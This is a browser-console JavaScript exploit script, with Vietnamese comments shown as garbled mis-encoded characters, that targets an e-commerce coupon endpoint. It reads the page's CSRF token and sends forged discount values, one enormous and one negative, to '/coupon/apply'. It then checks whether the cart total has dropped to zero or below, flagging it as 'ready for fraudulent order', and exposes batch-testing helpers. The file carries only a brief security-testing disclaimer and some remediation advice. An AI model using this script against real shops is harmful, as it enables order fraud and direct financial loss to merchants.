/**
 * üö® BROWSER CONSOLE COUPON EXPLOIT SCRIPT
 * Copy-paste script n√†y v√†o browser console khi ƒëang ·ªü trang c√≥ s·∫£n ph·∫©m trong cart
 * WARNING: CH·ªà S·ª¨ D·ª§NG ƒê·ªÇ TEST B·∫¢O M·∫¨T!
 */

console.log(`
üö® STARTING COUPON VULNERABILITY TEST
=====================================
‚ö†Ô∏è  CH·ªà S·ª¨ D·ª§NG ƒê·ªÇ TEST B·∫¢O M·∫¨T!
‚ö†Ô∏è  KH√îNG EXPLOIT H·ªÜ TH·ªêNG TH·ª∞C T·∫æ!
=====================================
`);

// Check if we're logged in and have CSRF token
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
if (!csrfToken) {
    console.error("‚ùå CSRF Token kh√¥ng t√¨m th·∫•y! H√£y ƒë·∫£m b·∫£o b·∫°n ƒë√£ ƒëƒÉng nh·∫≠p.");
    throw new Error("Missing CSRF Token");
}

console.log("‚úÖ CSRF Token found:", csrfToken);

// Function to test discount manipulation
async function exploitDiscountVulnerability() {
    console.log("\nüö® TESTING DISCOUNT MANIPULATION VULNERABILITY...");
    
    const maliciousDiscount = 999999999; // 999 tri·ªáu VNƒê
    
    try {
        const response = await fetch('/coupon/apply', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                coupon_code: 'FASTFOOD10',
                discount: maliciousDiscount
            })
        });
        
        const data = await response.json();
        
        console.log("üì° Server Response:", data);
        
        if (data.success === true) {
            if (data.discount && data.discount >= maliciousDiscount) {
                console.log(`
üö® CRITICAL VULNERABILITY CONFIRMED!
====================================
üí∞ Malicious discount accepted: ${data.discount.toLocaleString('vi-VN')} ƒë
üî• FINANCIAL IMPACT: EXTREME
üéØ Attack successful: Server accepted arbitrary discount value
                `);
                
                return { vulnerable: true, discount: data.discount };
                
            } else {
                console.log("‚ö†Ô∏è Server accepted coupon but may have limited discount amount");
                return { vulnerable: "partial", discount: data.discount };
            }
        } else {
            console.log("‚úÖ Server rejected malicious coupon (GOOD!)");
            console.log("Response:", data);
            return { vulnerable: false };
        }
        
    } catch (error) {
        console.error("‚ùå Request failed:", error);
        return { vulnerable: false, error: error.message };
    }
}

// Function to test negative discount (user gets paid)
async function exploitNegativeDiscount() {
    console.log("\nüö® TESTING NEGATIVE DISCOUNT VULNERABILITY...");
    
    const negativeDiscount = -1000000; // User gets 1 million VNƒê
    
    try {
        const response = await fetch('/coupon/apply', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken,
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                coupon_code: 'FASTFOOD10',
                discount: negativeDiscount
            })
        });
        
        const data = await response.json();
        
        if (data.success === true && data.discount < 0) {
            console.log(`
üö® NEGATIVE DISCOUNT VULNERABILITY!
==================================
üí∞ User will receive: ${Math.abs(data.discount).toLocaleString('vi-VN')} ƒë
üî• FINANCIAL IMPACT: CRITICAL - Company pays customer!
            `);
            return { vulnerable: true, profit: Math.abs(data.discount) };
        } else {
            console.log("‚úÖ Negative discount rejected (GOOD!)");
            return { vulnerable: false };
        }
        
    } catch (error) {
        console.error("‚ùå Negative discount test failed:", error);
        return { vulnerable: false, error: error.message };
    }
}

// Function to check current cart status
async function checkCartStatus() {
    console.log("\nüõí CHECKING CURRENT CART STATUS...");
    
    try {
        const response = await fetch('/cart', {
            method: 'GET',
            headers: {
                'Accept': 'text/html'
            }
        });
        
        const html = await response.text();
        
        // Look for total amount in HTML
        const totalMatches = html.match(/T·ªïng c·ªông[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
        if (totalMatches) {
            const total = parseInt(totalMatches[1].replace(/\./g, ''));
            console.log(`üíµ Current cart total: ${total.toLocaleString('vi-VN')} ƒë`);
            
            if (total <= 0) {
                console.log("üö® CART TOTAL IS ZERO OR NEGATIVE!");
                console.log("üíé Ready for free/profitable order!");
                return { total, status: "exploitable" };
            }
            
            return { total, status: "normal" };
        } else {
            console.log("‚ö†Ô∏è Could not extract cart total from HTML");
            return { total: null, status: "unknown" };
        }
        
    } catch (error) {
        console.error("‚ùå Cart check failed:", error);
        return { total: null, status: "error", error: error.message };
    }
}

// Main exploit function
async function runFullExploit() {
    console.log("\nüöÄ RUNNING FULL EXPLOIT CHAIN...");
    
    // Test 1: Basic discount manipulation
    console.log("\n--- TEST 1: DISCOUNT MANIPULATION ---");
    const discountResult = await exploitDiscountVulnerability();
    
    // Test 2: Negative discount  
    console.log("\n--- TEST 2: NEGATIVE DISCOUNT ---");
    const negativeResult = await exploitNegativeDiscount();
    
    // Test 3: Check cart status
    console.log("\n--- TEST 3: CART STATUS CHECK ---");
    const cartResult = await checkCartStatus();
    
    // Generate final report
    console.log(`
üìä FINAL SECURITY ASSESSMENT REPORT
====================================

üéØ DISCOUNT MANIPULATION:
${discountResult.vulnerable === true ? 'üö® CRITICAL - Fully exploitable' : 
  discountResult.vulnerable === 'partial' ? '‚ö†Ô∏è PARTIAL - Limited exploitation' : 
  '‚úÖ SECURE - Not exploitable'}

üéØ NEGATIVE DISCOUNT:
${negativeResult.vulnerable ? 'üö® CRITICAL - User can receive money' : '‚úÖ SECURE - Rejected'}

üéØ CART STATUS:
${cartResult.status === 'exploitable' ? 'üö® READY FOR FRAUDULENT ORDER' : 
  cartResult.status === 'normal' ? '‚úÖ Normal cart total' : 
  '‚ö†Ô∏è Status unknown'}

üõ°Ô∏è IMMEDIATE ACTIONS REQUIRED:
${discountResult.vulnerable || negativeResult.vulnerable ? `
1. üö® IMMEDIATELY implement server-side discount validation
2. üö® Remove client-controlled discount values  
3. üö® Add audit logging for all coupon applications
4. üö® Implement rate limiting
5. üö® Review all financial operations for similar vulnerabilities
` : '‚úÖ System appears secure for tested vulnerabilities'}

‚ö†Ô∏è EVIDENCE COLLECTED:
- Test Time: ${new Date().toISOString()}
- CSRF Token: ${csrfToken}
- Malicious Discount: ${discountResult.discount || 'N/A'}
- Cart Total: ${cartResult.total ? cartResult.total.toLocaleString('vi-VN') + ' ƒë' : 'Unknown'}
    `);
    
    return {
        discountVulnerable: discountResult.vulnerable,
        negativeVulnerable: negativeResult.vulnerable,
        cartStatus: cartResult.status,
        evidence: {
            csrfToken,
            maliciousDiscount: discountResult.discount,
            cartTotal: cartResult.total
        }
    };
}

// Auto-run the exploit
runFullExploit().then(results => {
    console.log("\n‚úÖ Exploit testing completed!");
    console.log("Results stored in window.exploitResults");
    window.exploitResults = results;
}).catch(error => {
    console.error("‚ùå Exploit testing failed:", error);
});

// Additional manual testing functions
window.testCouponExploit = {
    // Quick discount test
    quickTest: async (discount = 999999999) => {
        const response = await fetch('/coupon/apply', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': csrfToken
            },
            body: JSON.stringify({
                coupon_code: 'FASTFOOD10',
                discount: discount
            })
        });
        return response.json();
    },
    
    // Test multiple discount values
    batchTest: async () => {
        const testValues = [999999999, -1000000, 0.01, "999999999", "invalid"];
        const results = [];
        
        for (const value of testValues) {
            console.log(`Testing discount value: ${value}`);
            try {
                const result = await window.testCouponExploit.quickTest(value);
                results.push({ value, result });
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s between requests
            } catch (error) {
                results.push({ value, error: error.message });
            }
        }
        
        return results;
    }
};

console.log(`
üéØ MANUAL TESTING COMMANDS:
===========================
- window.testCouponExploit.quickTest(999999999)  // Test specific discount
- window.testCouponExploit.batchTest()            // Test multiple values
- window.exploitResults                           // View last test results
`); 